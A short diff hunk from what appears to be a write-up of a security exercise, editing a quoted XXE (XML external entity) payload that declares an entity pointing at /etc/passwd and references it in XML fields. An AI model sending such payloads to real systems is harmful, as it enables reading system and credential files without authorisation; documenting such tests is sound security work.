@@ -82,7 +82,7 @@ At first I tried the following payload:
 <!DOCTYPE foo [<!ENTITY example SYSTEM "/etc/passwd"> ]>
 <details>
     <subnet_mask>&example;</subnet_mask>
-    <test>&example;</test>
+    <test></test>
 </details>
 ```
 
